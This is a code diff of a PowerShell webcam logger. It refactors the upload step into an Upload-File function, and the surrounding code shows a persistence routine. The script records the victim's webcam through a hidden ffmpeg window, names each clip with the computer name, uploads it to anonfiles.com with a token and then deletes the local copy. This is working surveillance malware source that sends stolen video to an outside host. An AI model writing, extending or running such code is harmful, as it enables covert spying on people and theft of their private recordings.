@@ -35,6 +35,21 @@ function Add-LoggerPersistency {
     }
 }
 
+function Upload-File{
+    [CmdletBinding()]
+	param (
+		[parameter(Position=0,Mandatory=$True)]
+		[string]$path
+	);   
+     
+    $url="https://api.anonfiles.com/upload?token=$Anontoken";
+
+    if(Test-Path $path){
+        (New-Object System.Net.WebClient).UploadFile($url,$path) > $null | Wait-Process;
+        Remove-Item $path -Force;
+    }
+}
+
 function Start-WebcamLogger{
     [CmdletBinding()]
     param
@@ -58,7 +73,6 @@ function Start-WebcamLogger{
     while($count -ne $TimesRun){
         $time = Get-Date -Format "ddMMyyyyHHmm";
         $path = "$env:temp\camlog-$env:computername-$time.mkv";
-        $url="https://api.anonfiles.com/upload?token=$Anontoken";
         $ffmpegArgs = @(
             "-f dshow",
             "-s 1280x720",
@@ -71,13 +85,9 @@ function Start-WebcamLogger{
         );
 
         Start-Process -FilePath "ffmpeg-master-latest-win64-gpl\bin\ffmpeg.exe" -ArgumentList "$ffmpegArgs" -Wait -WindowStyle hidden
-        
-        if(Test-Path $path){
-            (New-Object System.Net.WebClient).UploadFile($url,$path) > $null | Wait-Process;
-            Remove-Item $path -Force;
-            Start-Sleep $Delay;
-        }
-        
+        Upload-File $path;
+                
+        Start-Sleep $Delay;
         $count++;
     }
 }
